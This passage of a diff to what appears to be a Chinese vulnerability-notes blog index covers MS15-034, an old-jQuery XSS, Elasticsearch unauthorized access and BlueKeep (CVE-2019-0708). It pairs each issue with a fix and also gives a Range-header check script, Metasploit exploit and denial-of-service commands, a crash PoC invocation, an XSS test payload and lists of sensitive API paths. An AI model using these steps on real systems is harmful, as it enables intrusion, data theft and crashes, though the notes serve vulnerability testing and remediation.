class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
-<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>命令执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jQuery库版本过低</title>
-    <url>//c7d50197fdce.html</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-<h2 id="jQuery简介"><a href="#jQuery简介" class="headerlink" title="jQuery简介"></a>jQuery简介</h2><p>　　jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。jQuery设计的目的是为了写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
-<p>　　在JQuery的诸多发行版本中，存在着DOM-based XSS（跨站脚本攻击的一种)漏洞，易被攻击者利用。漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞。这也是最为被大众熟知的jQuery的一个漏洞。</p>
-<h2 id="DOM-based-XSS-漏洞"><a href="#DOM-based-XSS-漏洞" class="headerlink" title="DOM-based XSS 漏洞"></a>DOM-based XSS 漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
-<li><p> jquery-1.7.1~1.8.3</p>
-</li>
-<li><p> jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p>
-</li>
-<li><p> jquery-1.5所有版本</p>
-</li>
-<li><p> jquery-1.4所有版本</p>
-</li>
-<li><p> jquery-1.3所有版本</p>
-</li>
-<li><p> jquery-1.2所有版本</p>
-</li>
-</ul>
-<p>影响版本不全面，建议升级到jquery-3.4.0以上</p>
-<h2 id="漏洞测试方法"><a href="#漏洞测试方法" class="headerlink" title="漏洞测试方法"></a>漏洞测试方法</h2><p>F12打开Console窗口，输入以下代码显示jquery版本号</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.fn.jquery</span><br></pre></td></tr></table></figure>
-
-<p>输入以下代码,如果有弹窗出现说明存在XSS漏洞</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;element[attribute=&#x27;&lt;img src=123123 οnerrοr=alert(123)&gt;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>升级jQuery库到jquery-3.4.0以上或者最新版本</p>
-<p>更新版本有可能存在众多问题，所以在不改变版本的情况下避免漏洞的利用（或者使用插件jQuery Migrate）</p>
-<h3 id="临时修复方案"><a href="#临时修复方案" class="headerlink" title="临时修复方案"></a>临时修复方案</h3><ul>
-<li><p> jquery文件重命名</p>
-</li>
-<li><p>把jquery文件里头部带有版本号的注释删除</p>
-</li>
-<li><p>把jquery文件内版本号清除（不推荐）</p>
-</li>
-<li><p> 在 jquery文件中重写版本号</p>
-</li>
-</ul>
-<p>一部分调用的插件失效了，所以在这里是重写jquery版本而不是清除jquery版本</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gqat654fwcj30dz02nmx4.jpg" alt="jQuery库版本过低.png"></p>
-<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="http://research.insecurelabs.org/jquery/test/">JQuery跨站脚本在线测试</a></p>
-<p><a href="https://blog.csdn.net/kang1011/article/details/109682718?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-3-109682718&spm=3001.4430">解决jquery版本过低引发的XSS跨站安全漏洞</a></p>
-<p><a href="https://blog.csdn.net/adminhui/article/details/103035516?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-4-103035516&spm=3001.4430">jquery版本安全漏洞问题</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>常见漏洞</category>
-      </categories>
-      <tags>
-        <tag>跨站类漏洞</tag>
-        <tag>中危漏洞</tag>
-        <tag>第三方库漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2443,46 +2456,135 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
-    <url>//ddf32da2222d.html</url>
-    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
-<li>Windows 7</li>
-<li>Windows server 2008 R2</li>
-<li>Windows server 2008</li>
-<li>Windows 2003</li>
-<li>Windows xp</li>
+    <title>jQuery库版本过低</title>
+    <url>//c7d50197fdce.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+<h2 id="jQuery简介"><a href="#jQuery简介" class="headerlink" title="jQuery简介"></a>jQuery简介</h2><p>　　jQuery是一个快速、简洁的JavaScript框架,是一个丰富的JavaScript代码库。jQuery设计的目的是为了写更少的代码，做更多的事情。它封装JavaScript常用的功能代码，提供一种简便的JavaScript设计模式，优化HTML文档操作、事件处理、动画设计和Ajax交互。</p>
+<p>　　在JQuery的诸多发行版本中，存在着DOM-based XSS（跨站脚本攻击的一种)漏洞，易被攻击者利用。漏洞原因在于过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞。这也是最为被大众熟知的jQuery的一个漏洞。</p>
+<h2 id="DOM-based-XSS-漏洞"><a href="#DOM-based-XSS-漏洞" class="headerlink" title="DOM-based XSS 漏洞"></a>DOM-based XSS 漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li><p> jquery-1.7.1~1.8.3</p>
+</li>
+<li><p> jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p>
+</li>
+<li><p> jquery-1.5所有版本</p>
+</li>
+<li><p> jquery-1.4所有版本</p>
+</li>
+<li><p> jquery-1.3所有版本</p>
+</li>
+<li><p> jquery-1.2所有版本</p>
+</li>
 </ul>
-<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
-<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+<p>影响版本不全面，建议升级到jquery-3.4.0以上</p>
+<h2 id="漏洞测试方法"><a href="#漏洞测试方法" class="headerlink" title="漏洞测试方法"></a>漏洞测试方法</h2><p>F12打开Console窗口，输入以下代码显示jquery版本号</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.fn.jquery</span><br></pre></td></tr></table></figure>
 
-<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
-
-<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+<p>输入以下代码,如果有弹窗出现说明存在XSS漏洞</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;element[attribute=&#x27;&lt;img src=123123 οnerrοr=alert(123)&gt;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
-<p>2.安装安全管家类的软件</p>
-<p>3.关闭远程桌面，开启防火墙</p>
-<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
+<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>升级jQuery库到jquery-3.4.0以上或者最新版本</p>
+<p>更新版本有可能存在众多问题，所以在不改变版本的情况下避免漏洞的利用（或者使用插件jQuery Migrate）</p>
+<h3 id="临时修复方案"><a href="#临时修复方案" class="headerlink" title="临时修复方案"></a>临时修复方案</h3><ul>
+<li><p> jquery文件重命名</p>
+</li>
+<li><p>把jquery文件里头部带有版本号的注释删除</p>
+</li>
+<li><p>把jquery文件内版本号清除（不推荐）</p>
+</li>
+<li><p> 在 jquery文件中重写版本号</p>
+</li>
+</ul>
+<p>一部分调用的插件失效了，所以在这里是重写jquery版本而不是清除jquery版本</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gqat654fwcj30dz02nmx4.jpg" alt="jQuery库版本过低.png"></p>
+<h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="http://research.insecurelabs.org/jquery/test/">JQuery跨站脚本在线测试</a></p>
+<p><a href="https://blog.csdn.net/kang1011/article/details/109682718?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-3-109682718&spm=3001.4430">解决jquery版本过低引发的XSS跨站安全漏洞</a></p>
+<p><a href="https://blog.csdn.net/adminhui/article/details/103035516?utm_term=javascript%E7%89%88%E6%9C%AC%E4%BD%8E%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-4-103035516&spm=3001.4430">jquery版本安全漏洞问题</a></p>
 ]]></content>
       <categories>
         <category>漏洞利用</category>
         <category>常见漏洞</category>
       </categories>
       <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
+        <tag>跨站类漏洞</tag>
+        <tag>中危漏洞</tag>
+        <tag>第三方库漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Elasticsearch未授权访问</title>
+    <url>//9db3aff65775.html</url>
+    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
+<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
+<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
+<p>返回内容包含<code>You Know,for Search</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
+<p>2.禁止外网访问</p>
+<p>3.认证插件安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
+
+<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">配置名</th>
+<th align="center">默认值</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">http.basic.enabled</td>
+<td align="center">true</td>
+<td align="center">开关，开启会接管全部HTTP连接</td>
+</tr>
+<tr>
+<td align="center">http.basic.user</td>
+<td align="center">“admin”</td>
+<td align="center">账号</td>
+</tr>
+<tr>
+<td align="center">http.basic.password</td>
+<td align="center">“admin”</td>
+<td align="center">密码</td>
+</tr>
+<tr>
+<td align="center">http.basic.ipwhitelist</td>
+<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
+<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
+</tr>
+<tr>
+<td align="center">http.basic.trusted_proxy_chains</td>
+<td align="center">[“172.16.18.114”]</td>
+<td align="center">信任代理列表</td>
+</tr>
+<tr>
+<td align="center">http.basic.log</td>
+<td align="center">false</td>
+<td align="center">把无授权的访问事件添加到ES的日志</td>
+</tr>
+<tr>
+<td align="center">http.basic.xforward</td>
+<td align="center">“X-Forwarded-For”</td>
+<td align="center">记载代理路径的header字段名</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>服务器应用漏洞</category>
+        <category>未授权访问漏洞</category>
+      </categories>
+      <tags>
+        <tag>未授权访问</tag>
       </tags>
   </entry>
   <entry>
@@ -2773,77 +2875,46 @@
       </tags>
   </entry>
   <entry>
-    <title>Elasticsearch未授权访问</title>
-    <url>//9db3aff65775.html</url>
-    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
-<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
-<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
-<p>返回内容包含<code>You Know,for Search</code></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
+    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
+    <url>//ddf32da2222d.html</url>
+    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
